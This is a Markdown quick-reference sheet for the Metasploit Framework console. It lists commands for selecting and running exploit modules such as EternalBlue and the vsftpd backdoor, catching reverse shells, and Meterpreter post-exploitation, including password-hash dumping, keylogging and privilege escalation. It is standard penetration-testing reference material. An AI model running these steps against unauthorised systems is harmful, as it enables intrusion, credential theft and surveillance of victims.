# Metasploit Cheatsheet

> Quick reference for Metasploit Framework (msfconsole).

```bash
# ──────────────────────────────────────────────
# LAUNCH
# ──────────────────────────────────────────────
msfconsole          # Start with banner
msfconsole -q       # Start quietly
msfdb init          # Initialize database

# ──────────────────────────────────────────────
# SEARCH & USE
# ──────────────────────────────────────────────
search <keyword>                    # Search modules
search type:exploit platform:linux  # Filter search
use <module_path>                   # Select module
use 0                               # Use result #0 from search
info                                # Show module info
back                                # Go back

# ──────────────────────────────────────────────
# OPTIONS
# ──────────────────────────────────────────────
show options          # Required options
show payloads         # Compatible payloads
show targets          # Available targets
set RHOSTS <ip>       # Target host
set RPORT <port>      # Target port
set LHOST <ip>        # Listener host (your IP)
set LPORT <port>      # Listener port
set PAYLOAD <path>    # Set payload
setg LHOST <ip>       # Set globally

# ──────────────────────────────────────────────
# RUN
# ──────────────────────────────────────────────
run             # Execute module
exploit         # Same as run
check           # Check if target is vulnerable (if supported)
exploit -j      # Run as background job

# ──────────────────────────────────────────────
# SESSIONS
# ──────────────────────────────────────────────
sessions -l         # List sessions
sessions -i 1       # Interact with session 1
sessions -k 1       # Kill session 1
background          # Background current session (Ctrl+Z)

# ──────────────────────────────────────────────
# METERPRETER
# ──────────────────────────────────────────────
sysinfo             # System info
getuid              # Current user
getsystem           # Try privilege escalation
hashdump            # Dump password hashes
ps                  # List processes
migrate <PID>       # Migrate to process
shell               # Drop to system shell
upload <src> <dst>  # Upload file
download <src>      # Download file
screenshot          # Take screenshot
keyscan_start       # Start keylogger
keyscan_dump        # Show captured keys
run post/multi/recon/local_exploit_suggester  # Suggest privesc

# ──────────────────────────────────────────────
# COMMON EXPLOITS
# ──────────────────────────────────────────────
use exploit/windows/smb/ms17_010_eternalblue  # EternalBlue
use exploit/unix/ftp/vsftpd_234_backdoor      # vsftpd backdoor
use exploit/multi/samba/usermap_script        # Samba
use exploit/multi/handler                     # Catch reverse shells
```
